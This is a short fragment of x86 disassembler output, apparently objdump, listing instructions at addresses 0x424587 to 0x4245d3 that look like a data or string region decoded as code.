  424587:	add    BYTE PTR [edi+0x0],bl
  42458a:	aaa    
  42458b:	add    BYTE PTR [edx+0x0],al
  42458e:	add    BYTE PTR [eax],al
  424590:	push   edx
  424591:	add    BYTE PTR [ecx],bh
  424593:	add    BYTE PTR [esi+0x0],dl
  424596:	pop    edi
  424597:	add    BYTE PTR [eax+eax*1],dh
  42459a:	push   edx
  42459b:	add    BYTE PTR [ecx+0x0],bl
  42459e:	pop    edi
  42459f:	add    BYTE PTR [eax],bh
  4245a1:	add    BYTE PTR [eax],dh
  4245a3:	add    BYTE PTR [edx+0x0],bl
  4245a6:	add    BYTE PTR [eax],al
  4245a8:	add    BYTE PTR [eax],al
  4245aa:	nop
  4245ab:	inc    edx
  4245ac:	add    BYTE PTR [eax+edx*4],al
  4245af:	inc    edx
  4245b0:	add    BYTE PTR [eax],cl
  4245b2:	nop
  4245b3:	inc    edx
  4245b4:	add    BYTE PTR [eax+edx*4],cl
  4245b7:	inc    edx
  4245b8:	add    BYTE PTR [eax],dl
  4245ba:	nop
  4245bb:	inc    edx
  4245bc:	add    BYTE PTR [eax+edx*4],dl
  4245bf:	inc    edx
  4245c0:	add    BYTE PTR [eax],bl
  4245c2:	nop
  4245c3:	inc    edx
  4245c4:	add    BYTE PTR [eax+edx*4],bl
  4245c7:	inc    edx
  4245c8:	add    BYTE PTR [eax],ah
  4245ca:	nop
  4245cb:	inc    edx
  4245cc:	add    BYTE PTR [eax+edx*4],ah
  4245cf:	inc    edx
  4245d0:	add    BYTE PTR [eax],ch
  4245d2:	nop
  4245d3:	inc    edx
	...
